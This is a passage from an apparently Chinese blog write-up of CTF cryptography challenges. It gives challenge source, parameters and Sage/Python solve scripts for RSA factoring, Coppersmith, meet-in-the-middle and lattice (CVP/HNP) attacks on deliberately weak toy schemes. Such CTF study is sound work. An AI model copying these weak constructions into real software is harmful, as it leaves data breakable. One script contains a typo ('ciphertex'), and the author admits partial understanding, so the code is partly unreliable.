class="line"><span class="keyword">if</span> __name__ ==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    e=<span class="number">65537</span></span><br><span class="line">    n=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984460699747964946764645986828307675081596907634022110868102739948513844625534865764252668312850364286204872187001344218083941399088833989233474318289529103178632284291007694811574023047207470113594082533713524606268388742119103653587354956091145288566437795469230667897089543048576812362251576281067933183713438502813206542834734983616378764909202774603304124497453696792428111112644362307853143219890039129054302905340695668256116233515323529918746264727874817221051242387145263342018617858562987223211598238069486447049955021864781104312134816578626968386395835285074116149472750100154961405785440009296096563521430833</span></span><br><span class="line">    phi=<span class="number">3191868707489083296976422171754481125088448532695639929013026951283334085716937496519972309690132954050242378974370025245594553866043111294840209514577676946872746793700126873931085112786381515154186105142460622301297252278473097650013016482539838576476763183025029834004241446095147665598581368214114851984394758254181484105857103844940487787404078873566779953101987404891507588290232992132681729619718279684673827347612899406697514777723904351697638562060304399923174376216080338949397741477013367831377040866937433520175862575061413321076151761545984886547872427147498175814451096795344136954743868643889768901204954902708679102384061694877757565486240670882343628571424084461972849147495569088820011108794930593172573959423278140327579049114196086428504291102619820322231225943837444001821535593671764186251713714593498207219093585758479440828038119079608764008747539277397742897542501803218788455452391287578171880267200</span></span><br><span class="line">    c=<span class="number">8847973599594272436100870059187158819529199340583461915617467299706215012295598155778224026186157290320191983062022702191439286020733625396165573681688842631368993650799220713225485752608650482408353598320160571916055498330875851476520668973214124194890108144336715482373743731578734960096351460142579903010557821654345995923836938260379746304222820835040419844947019844885128550552066290798665884099701340641403329066058638137944934073185448687990744852400616823426082588916251127609191094346267837812018236673478691437630461425526779014305216914035039981685211625653600564431704400207095883904994772993227506462664</span></span><br><span class="line">    fac = factorize_multi_prime(n, phi)</span><br><span class="line">    p,q,r=<span class="built_in">sorted</span>(fac)</span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    n=p*q</span><br><span class="line">    d=inverse(e,phi)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)).decode())</span><br></pre></td></tr></table></figure><p>没想到这题居然还可以用<strong>coppersmith attack</strong>，长见识了，还得是<strong>xm爷</strong></p><p>$s\equiv c^{d}\ mod\ n_{1}\equiv m^{e*d}\ mod\ n_{2}\ mod\ n_{1}\equiv m\ mod\ n_{2}\ mod\ n_{1}$</p><p>同时呢，<code>m</code>肯定是比<code>n1,n2</code>小的，看完<code>exp</code>，怎么说呢，有点似懂非懂(我这里写的思路也不一定对哦)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line">n = </span><br><span class="line">phi = </span><br><span class="line">c = </span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = inverse(e,phi)</span><br><span class="line">s = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x-s</span><br><span class="line">res = f.small_roots(x=<span class="number">2</span>^<span class="number">2048</span>,beta = <span class="number">0.4</span>, epsilon = <span class="number">0.05</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(res[<span class="number">0</span>])).decode())</span><br></pre></td></tr></table></figure><h2 id="MIMT-RSA"><a href="#MIMT-RSA" class="headerlink" title="MIMT_RSA"></a>MIMT_RSA</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY， flag  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">int</span>(KEY).bit_length() == <span class="number">36</span></span><br><span class="line"><span class="keyword">assert</span> <span class="keyword">not</span> isPrime(KEY)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line"></span><br><span class="line">ck = <span class="built_in">pow</span>(KEY, e, n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(KEY).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;e = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ck = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line"><span class="string">e = 65537</span></span><br><span class="line"><span class="string">ck = 8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>中间相遇攻击</strong>，原理不难，36位的非素数，随便测了几个数字，大致可以分解为18和20位的两个数字</p><p>参考<a href="https://tangcuxiaojikuai.xyz/post/601c0957.html">https://tangcuxiaojikuai.xyz/post/601c0957.html</a>，<strong>NCTF2021-rsa</strong>，这题还是挺有意思的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line">n = <span class="number">26563847822899403123579768059987758748518109506340688366937229057385768563897579939399589878779201509595131302887212371556759550226965583832707699167542469352676806103999861576255689028708092007726895892953065618536676788020023461249303717579266840903337614272894749021562443472322941868357046500507962652585875038973455411548683247853955371839865042918531636085668780924020410159272977805762814306445393524647460775620243065858710021030314398928537847762167177417552351157872682037902372485985979513934517709478252552309280270916202653365726591219198063597536812483568301622917160509027075508471349507817295226801011</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">ck = <span class="number">8371316287078036479056771367631991220353236851470185127168826270131149168993253524332451231708758763231051593801540258044681874144589595532078353953294719353350061853623495168005196486200144643168051115479293775329183635187974365652867387949378467702492757863040766745765841802577850659614528558282832995416523310220159445712674390202765601817050315773584214422244200409445854102170875265289152628311393710624256106528871400593480435083264403949059237446948467480548680533474642869718029551240453665446328781616706968352290100705279838871524562305806920722372815812982124238074246044446213460443693473663239594932076</span></span><br><span class="line">secret = <span class="number">0</span></span><br><span class="line">S = &#123;<span class="built_in">pow</span>(i,-e,n):i <span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">20</span>))&#125;</span><br><span class="line">inv_ck = inverse(ck,n)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">2</span>**<span class="number">18</span>):</span><br><span class="line">    s = inv_ck*(<span class="built_in">pow</span>(j,e,n))%n</span><br><span class="line">    <span class="keyword">if</span>(s <span class="keyword">in</span> S):</span><br><span class="line">        secret = S[s]*j</span><br><span class="line">        flag = <span class="string">b&#x27;NSSCTF&#123;&#x27;</span> + md5(<span class="built_in">str</span>(secret).encode()).hexdigest().encode() + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="baby-lattice"><a href="#baby-lattice" class="headerlink" title="baby_lattice"></a>baby_lattice</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">miku = <span class="number">30</span></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">key = getPrime(<span class="number">512</span>)</span><br><span class="line"><span class="keyword">while</span> key&gt; p:</span><br><span class="line">    key= getPrime(<span class="number">512</span>)</span><br><span class="line">ts = []</span><br><span class="line">gs = []</span><br><span class="line">zs = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(miku):</span><br><span class="line">    t = getPrime(<span class="number">512</span>)</span><br><span class="line">    z = getPrime(<span class="number">400</span>)</span><br><span class="line">    g= (t * key + z) % p</span><br><span class="line">    ts.append(t)</span><br><span class="line">    gs.append(g)</span><br><span class="line">    zs.append(z)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;p = <span class="subst">&#123;p&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ts = <span class="subst">&#123;ts&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;gs = <span class="subst">&#123;gs&#125;</span>&#x27;</span>)</span><br><span class="line">iv= os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">ciphertext=cipher.encrypt(pad(flag.encode(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;iv=<span class="subst">&#123;iv&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;ciphertext=<span class="subst">&#123;ciphertext&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>下面参考的是<strong>小鸡块师傅</strong>的<strong>CVP</strong>做法，<a href="https://tangcuxiaojikuai.xyz/post/6a2afd81.html">https://tangcuxiaojikuai.xyz/post/6a2afd81.html</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">p = <span class="number">13401991645840298882794100147034379521242237285821020793208518466205688272722127694554243298223159648613332253774886696888511245155898681828972316158766813</span></span><br><span class="line">ts = [<span class="number">8016983781273189754281912962247057409930227455812224730112055674262101679986538896353333785641031178561641562965339977035588567181180100475283408488320671</span>, <span class="number">12980173980684618239567238092970002844391225790428809984588444288874980047043175328056782109973890659670718383856150425014293022930574469326618263083648099</span>, <span class="number">8109856702010014482292978050018141635784057812487351143916154508689142112615449144377702002382005662470835964315028619291602564624893518861557701327890923</span>, <span class="number">12785373226115694299429762427866573289359143336748874789256870948157808484043436344897926547699412946084053665605873366419653263394817308889578649556482317</span>, <span class="number">12293720016807713691819354075258380849321736691923473670291035750221768289875347194928451102365603432383881559318603460687890903510706219895796459019974867</span>, <span class="number">9784378896444105030039569921777285228994264456281120536753266782980679466146906618674672118057906497814953677764528302638725540882074537262487534252076829</span>, <span class="number">9241433814815706758885649801540944918822400007457713603674159882791199750057709773097552334465041959969676782253637817171507122904345522225398825682237481</span>, <span class="number">11204803848333722110323297716136514262820561394355433234423667799557561253910421337700868735544193790444406938869863716247161888020220901893711513603634809</span>, <span class="number">10851090251796215969502640347727949807230163009657915435491546953253351810608099195268759626721620529756828379004467476267712531905975334082089231769707617</span>, <span class="number">11250957460128461102060212243723539805901629603092001540925013383541943835129096257407578679799378517176957440298695788786794500447140718667332595080944869</span>, <span class="number">12248623923069220370917375593286718711586079377902376988707257328512455851210970182518826733646869485671374318338949112466814956514662420760908691130244383</span>, <span class="number">11061068271412202445428992286301637014530049371871820612053163253748795430394720967354122057185625710764847486790478210908967065668096047462000900877243843</span>, <span class="number">9250800791153158078642768324800520716511537203538708124830844957330029236789799844775267058446261708862442981956837389747149720449997356553753692631237873</span>, <span class="number">11442112467994330302413453979716258058149104607244851803491048585747359474970005873336772224480265499136742622823880716879860377641238675210553131052206691</span>, <span class="number">8851268226889934481971979527547782930762103134830344221114784617526682434893736517219781937490279514229768881864475696389373739501629994242420024622585309</span>, <span class="number">8761826274329402585517262093482651333161640060627583337505498299736119877176278155436111156185319629046980645810012652601825582701466570339570478108791887</span>, <span class="number">8173260008522260126563915135008278248111293487661172115633899079869720932758788675224579864948752039769531398938248083971071345978173279466336354696742377</span>, <span class="number">11733325877716881936637372036969125985631514189799569847189115606745019694984456424617859168884541552882900918661071180298079869943357668081866511603361429</span>, <span class="number">12798678249651545625305346509566263707129030745621625744465668772298872710674031103310015594375483838020916596533864897632924958154707810583510669376046159</span>, <span class="number">11972367565183102195894957634073708898746516169055154830786380821612631063771935949099855541345280195465211676841845799521135332692746439801114025346776451</span>, <span class="number">8309485355838062558333744941897142201736283502970173073711189070760311131678107029730686549988329677109870570827466668034034377094834508445549924223585219</span>, <span class="number">10037957030668927878463105058548635761147918169468443696251870837018029994579358415317101911755591591785037623566701920710453008930531891302329922308475079</span>, <span class="number">13221078857886779075714191159549244640144219704164657103905516889650093241197471185563906205007376146027157620524696025494715411571586859030421582641250071</span>, <span class="number">13377141034964464295846379646837504968557246139611266461228568513844912255762222441387410898249170108735540582627742796017922462329606088337301365183628591</span>, <span class="number">11503417590216916228951909788782481610038959664264972733435373475346403291387209063270057139621628854733942831548624992555175497319058962145185736395531609</span>, <span class="number">10682562966818807073688884352394574841623385668134186058213080078637580526582062737913378756835873195913042020318042792997704842570481165538229628253983417</span>, <span class="number">7009494733984067792833862756223517770477471938386639921019003601598472840183655333614008677846799784155444425042016748876974547683111073376705004070094301</span>, <span class="number">9396274922380984183217450286560296708001013262936289587249206096013034374236192395477584831821730898646879768741299571262843654547918064041618890696711333</span>, <span class="number">9055143657462834722016836241561857041386247088507191351272758917384350750091500866289528933248085632291073921554368989805281660196853938630560350667255913</span>, <span class="number">7075881589550115729079726581415060529537262743216265811601339312252250745864621882784185460812341989475906020671174894015501378625757286896275136526488817</span>]</span><br><span class="line">gs = [<span class="number">3547025130757031371763547817278671805806523773597386380426228204353325314755125874825372064344551510783942287325061869515563511720377069479838665918916338</span>, <span class="number">561524185998066303459395863084068415723518371857539287162474295289737845979144864495515229777991463363132381517905379393086271602757286846999926034367409</span>, <span class="number">10630918988200018501478600883655233518093875635494077893436132190015060760951001030031068630865667129447250982542911493607849695255758299063471724885107320</span>, <span class="number">5385738167688714294394456876987750423263279740302210790063861475593679005286633965917637168163655774852001750955925563171806165861440634515967640179944804</span>, <span class="number">3686451063569312252337028014973428925521749963152262622523483348285262144703447272544972123815729823760936936761643322992469583780002855185407873398768127</span>, <span class="number">9596580956215126253893458055745193704575088913515678341231900675542245449333964660007025564677263334281046226112471415925784249910282102204627251580303047</span>, <span class="number">9656829597739031272294632966205884640125918053307645634673206826103547310810254891833432384622548154588598670746803614688469837172848481449498079690935715</span>, <span class="number">9907308304392368929600091658386459655450451232070442677496713774343506026327224070703486188335961098033888098971263207077722473044862118000082007110037557</span>, <span class="number">7839372385123283975949639433665292734490760458360682832497005213559939527031767909811695257768341209806346811519315554587887588294359891829457980910373676</span>, <span class="number">9524560447616291402016995361580593070951296833074538783490159546001656765257005901587161833656370873513309819850104060230660386406669378214335512722509152</span>, <span class="number">8734422874517209772760818316188000967216535009508164549745674472106165337990045713973843427581730460676070294620298664038968581128044873585552989614725336</span>, <span class="number">5148158222052082942951739997892280954937954769195857112271289335776175568625514426629773392655353554820374445881301175856523121361252868192790918069469104</span>, <span class="number">3405639365216597742633558534342314393231966921971024333387009357007031255109911181571542920889177048552084631482291912851876735480121959418518626599223928</span>, <span class="number">6965895908963098896413697893751255263053889382630643791713636829201586125658579731479485123904224727756791164618191156426250811133029277086293720268527300</span>, <span class="number">515472047175628755463279789359658211455570096067652817360508027869002916852457796014115363850477155232728049656195126940493402028508630979737222916876246</span>, <span class="number">8377848726362282033165443045774756072489017398005262818165334796393061408947900148462399707261050565348807577258621241416711089587307194346694505937252864</span>, <span class="number">1178755053483981880338850194698011124968424379914871101461970724324613752209283539401502897388962321646518511682063263530792638817282211333222820982688221</span>, <span class="number">6409725586399153562174435158247599193499008381130383743433623949976530392240171542527657077771723107664747118903213393154893390715457247849808357209465942</span>, <span class="number">3372824803484968486680937546271819996332625362891283809637871759604598252172343794474197823370030403360262989580844260103083478034905726890611202238641340</span>, <span class="number">13221067729455004299677399984872603663881675510140157358091630484387026309376774076498558628883879446483977202290444900329681753187886973457338777404374837</span>, <span class="number">7168388056726802823482632673894477305062116631923141017136239676696007696629606782541016490173953868270727600022309320772114799519383514048456314407549126</span>, <span class="number">5250230933448962245502125593869313477032913928941516938273943408457441209365441112912617832856547549404891414953525445963675011329667621804152746371657313</span>, <span class="number">8511291855606246692070730459514263912089592580342504124890734122750181111943376656479213361961009582891618556261302703133404839204999651359329176948170842</span>, <span class="number">10576966024912004586600985705328475294820172279541596349092328002861342696932964481093301707680584309062968518297314914578723605267596141569538103299931592</span>, <span class="number">12610576251820483830699440118009518195547953924641848179631259695652398482759919292823264035055444639679877606276670927735340951916197191958922906156370663</span>, <span class="number">3742260845065949575192054445757226288737527960324254459850715703182879384214273141678432129201712761002566924178045796602250837169613100836509080462118064</span>, <span class="number">11563799338655584285772430060426469486983276581413105960901201146319641194721216394735314795999096052047566733050321685673448559752053334666493545565267458</span>, <span class="number">2135904971793751083168704063674429207856744601756475004904460101727999030934815461118290836502605293753384609825541213034656253854812143724421464450937515</span>, <span class="number">3115138049292154301818359336614981367419382594686950083225042221335435796679806070685800479754927915293066789893346628151325862299622031407323031470432866</span>, <span class="number">11834987428374239733081967249175125232293539826462896997963240557834259212701171232384194311849363016441847536816726226234955703291712817155658535826680986</span>]</span><br><span class="line">iv = <span class="string">b&#x27;\x88\x0c\x7f\x92\xd7\xb7\xaf4\xe4\xfb\xd1_\xab\xff)\xb8&#x27;</span></span><br><span class="line">ciphertext = <span class="string">b&#x27;\x94\x198\xd6\xa2mK\x00\x06\x7f\xad\xa0M\xf7\xadV;EO$\xee\xcdB0)\xfb!&amp;8%,M&#x27;</span></span><br><span class="line">rs = ts</span><br><span class="line">cs = gs</span><br><span class="line"></span><br><span class="line">G=GF(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Babai_closest_vector</span>(<span class="params">M, G, target</span>):</span><br><span class="line">  small = target</span><br><span class="line">  <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">reversed</span>(<span class="built_in">range</span>(M.nrows())):</span><br><span class="line">      c = ((small * G[i]) / (G[i] * G[i])).<span class="built_in">round</span>()</span><br><span class="line">      small -= M[i] * c</span><br><span class="line">  <span class="keyword">return</span> target - small</span><br><span class="line"></span><br><span class="line">m = <span class="number">30</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">A = matrix(ZZ, m+n, m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[i, i] = p</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    A[m , x] = rs[x]</span><br><span class="line">lattice = IntegerLattice(A, lll_reduce=<span class="literal">True</span>)</span><br><span class="line"> </span><br><span class="line">gram = lattice.reduced_basis.gram_schmidt()[<span class="number">0</span>]</span><br><span class="line">target = vector(ZZ, cs)</span><br><span class="line">res = Babai_closest_vector(lattice.reduced_basis, gram, target)</span><br><span class="line">R = IntegerModRing(p)</span><br><span class="line">M = Matrix(R, rs)</span><br><span class="line">res=vector(R, res)</span><br><span class="line"><span class="keyword">for</span> i,j <span class="keyword">in</span> <span class="built_in">zip</span>(cs,res):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">bin</span>(i-j))-<span class="number">2</span>==<span class="number">400</span></span><br><span class="line">key=((res[<span class="number">0</span>])*inverse(rs[<span class="number">0</span>],p)) %p</span><br><span class="line">cipher = AES.new(<span class="built_in">str</span>(key).encode()[:<span class="number">16</span>], AES.MODE_CBC,iv)</span><br><span class="line">flag = cipher.decrypt(ciphertex)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><p>奇怪的是，我<code>HNP</code>构造的格出不来，我感觉已经是配平了的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">M = Matrix(ZZ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^(<span class="number">512</span>-<span class="number">400</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p * k</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i] * k</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i] * k</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = <span class="number">1</span></span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = <span class="number">2</span>^<span class="number">512</span></span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == <span class="number">2</span>^<span class="number">512</span>:</span><br><span class="line">        <span class="built_in">print</span>(i[-<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p>然后，翻了一下别的师傅的<code>wp</code>(在下面)，发现，这里规约出来的都是<strong>p-key</strong>？？？人傻了，这是什么原理？看了一下出题人自己的<a href="https://suhanhan-cpu.github.io/2025/03/19/2025%20GHCTF%20Writeup/">wp</a>，好像并没有这个问题<br><img src="https://pic1.zhimg.com/80/v2-e74d7d58b38938f539b9cf92783a11cf_1440w.png" alt=""><br>会这样的吗，不理解，那就下次记住吧(???)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">L = Matrix(QQ,<span class="number">32</span>,<span class="number">32</span>)</span><br><span class="line">k = <span class="number">2</span>^<span class="number">400</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">    L[i,i] = p</span><br><span class="line">    L[-<span class="number">2</span>,i] = ts[i]</span><br><span class="line">    L[-<span class="number">1</span>,i] = gs[i]</span><br><span class="line">L[-<span class="number">2</span>,-<span class="number">2</span>] = k/p</span><br><span class="line">L[-<span class="number">1</span>,-<span class="number">1</span>] = k</span><br><span class="line"></span><br><span class="line">res = L.LLL()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    <span class="keyword">if</span> i[-<span class="number">1</span>] == k:</span><br><span class="line">        key = p-(<span class="built_in">abs</span>(i[-<span class="number">2</span>].numerator())/k)</span><br></pre></td></tr></table></figure><h2 id="EZ-Fermat-bag-Pro"><a href="#EZ-Fermat-bag-Pro" class="headerlink" title="EZ_Fermat_bag_Pro"></a>EZ_Fermat_bag_Pro</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> f, flag</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">88</span></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">b&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> flag.endswith(<span class="string">b&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">P.&lt;x,y&gt; = ZZ[]</span><br><span class="line">f = P(<span class="built_in">str</span>(f))</span><br><span class="line"></span><br><span class="line">w = <span class="built_in">pow</span>(<span class="number">2</span>,f(p,q),n)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>(<span class="built_in">chr</span>(i) <span class="keyword">in</span> <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">set</span>(<span class="built_in">str</span>(p)))) <span class="keyword">for</span> i <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>:])</span><br><span class="line">c = bytes_to_long(flag) % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;f = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;w = &#125;</span>\n&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c = &#125;</span>\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n = 95656952327201449381426394713246214670537600365883923624876350719801926817916514429721785287844335184715049179879891389941974481490433975689601829920289485889138252888029716516069912637121531561601839948367426922036690701168975937162280451323099126372019216020898338909808577022618554997063496690156977790629</span></span><br><span class="line"><span class="string">f = x^31 - x^30*y - 2*x^29*y^2 + 7*x^28*y^3 + 2*x^27*y^4 - 4*x^24*y^7 + 3*x^23*y^8 - x^20*y^11 - 4*x^19*y^12 + x^18*y^13 - 5*x^17*y^14 - 4*x^16*y^15 - x^15*y^16 + x^14*y^17 + x^13*y^18 + x^12*y^19 - 2*x^11*y^20 - 3*x^9*y^22 + 5*x^7*y^24 + x^6*y^25 + 6*x^4*y^27 + x^3*y^28 + 2*x*y^30 + y^31 - 2*x^30 - 3*x^29*y + 2*x^28*y^2 + 2*x^27*y^3 - x^26*y^4 - x^25*y^5 - 2*x^24*y^6 - 3*x^23*y^7 - 3*x^22*y^8 - 3*x^20*y^10 - 4*x^19*y^11 + 2*x^18*y^12 + x^15*y^15 - x^14*y^16 - 2*x^12*y^18 - 3*x^11*y^19 - x^10*y^20 + x^9*y^21 + 2*x^8*y^22 + x^7*y^23 + x^5*y^25 - x^4*y^26 - 2*x^3*y^27 - 2*x^2*y^28 - y^30 - 2*x^29 - x^28*y + 3*x^26*y^3 - x^25*y^4 - 2*x^24*y^5 + x^23*y^6 - x^22*y^7 - x^20*y^9 + 2*x^19*y^10 + 2*x^18*y^11 + x^16*y^13 + x^15*y^14 + x^14*y^15 + x^13*y^16 + x^12*y^17 + 5*x^11*y^18 - x^9*y^20 - 2*x^8*y^21 - 5*x^7*y^22 - 2*x^6*y^23 + 3*x^5*y^24 - 5*x^3*y^26 - x^2*y^27 + 2*x*y^28 - y^29 + 3*x^28 + 3*x^27*y - 2*x^26*y^2 + x^25*y^3 + 2*x^24*y^4 - x^23*y^5 - 2*x^22*y^6 - 3*x^20*y^8 - 3*x^19*y^9 + 4*x^17*y^11 - x^16*y^12 - 3*x^15*y^13 - 2*x^14*y^14 + x^13*y^15 + 2*x^12*y^16 - 2*x^11*y^17 + x^10*y^18 - 2*x^9*y^19 + x^8*y^20 - 2*x^7*y^21 - x^6*y^22 + x^5*y^23 - x^4*y^24 + x^3*y^25 + x^2*y^26 - x*y^27 - y^28 + x^27 + x^26*y - 2*x^24*y^3 + x^23*y^4 - 3*x^22*y^5 - 2*x^21*y^6 - 2*x^20*y^7 - 5*x^19*y^8 + 2*x^18*y^9 - 5*x^17*y^10 + x^16*y^11 - 3*x^15*y^12 - 4*x^14*y^13 - x^13*y^14 + x^12*y^15 + 3*x^11*y^16 + 2*x^10*y^17 - 4*x^9*y^18 - 2*x^6*y^21 + x^5*y^22 + 4*x^3*y^24 + 2*x^2*y^25 + 2*x*y^26 - 2*y^27 + x^25*y + x^24*y^2 + x^23*y^3 + 5*x^22*y^4 + x^20*y^6 - 3*x^19*y^7 + x^18*y^8 - x^17*y^9 + 2*x^15*y^11 - x^14*y^12 + 2*x^13*y^13 - x^12*y^14 + 4*x^11*y^15 - x^10*y^16 - 2*x^6*y^20 - x^5*y^21 + 3*x^3*y^23 + x^2*y^24 - 3*x*y^25 - 3*y^26 + 3*x^25 - 